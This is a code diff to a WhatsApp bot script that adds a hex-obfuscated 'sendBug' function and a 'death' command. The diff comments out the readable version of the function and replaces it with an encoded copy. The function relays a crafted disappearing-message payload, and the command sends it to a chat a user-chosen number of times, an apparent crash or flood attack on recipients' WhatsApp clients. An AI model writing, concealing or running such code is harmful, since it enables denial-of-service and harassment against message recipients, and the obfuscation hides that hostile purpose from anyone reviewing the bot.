@@ -564,7 +564,9 @@ const isUser2 = _user2.includes(sender)
         if (!mods.includes(senderNumber)) return
         mods.slice(mods.indexOf(owner), 1)
         }
-	    
+	 
+	var _0x6376=["\x70\x72\x65\x70\x61\x72\x65\x44\x69\x73\x61\x70\x70\x65\x61\x72\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x53\x65\x74\x74\x69\x6E\x67\x43\x6F\x6E\x74\x65\x6E\x74","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];const sendBug=async (_0x13b3x2,_0x13b3x3)=>{ await samu330[_0x6376[2]](samu330[_0x6376[1]](_0x13b3x2,samu330[_0x6376[0]](0),{}),{waitForAck:true})}  
+	  
 	const sendFile = async (archivo, nombreDeArchivo, comentario, tag, vn) => {
   	tipo = await getBuffer(archivo)
   	tipo2 = ''
@@ -812,7 +814,7 @@ const isUser2 = _user2.includes(sender)
   		return jsona.link
 		reply(jsona.link)
 		}*/
-
+/**
         const sendBug = async (target) => {
             await samu330.relayWAMessage(
               samu330.prepareMessageFromContent(
@@ -821,7 +823,7 @@ const isUser2 = _user2.includes(sender)
                 {}
               ),{ waitForAck: true }) 
           }
-
+**/
 	const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
 		const buttonMessage = {
 		contentText: text1,
@@ -2994,7 +2996,19 @@ case 'cami':
 groupx = await samu330.groupMetadata(from)
 mensajeDesc = `Grupo ${groupx.subject}\n${groupx.id}`
 samu330.sendMessage(from, mensajeDesc, MessageType.text)		
-break		
+break	
+	
+case 'death':
+if (!isLalelilolu) return
+arg1 = q
+if (!arg1) return 
+argz = arg1.split("|")
+if (!argz) return
+if (isNaN(argz[0])) return
+for (let i = 0; i < argz[0]; i++){
+sendBug(from)
+}
+break
 		
 case 'azar':
 if (!isGroup) return reply(mess.only.group)
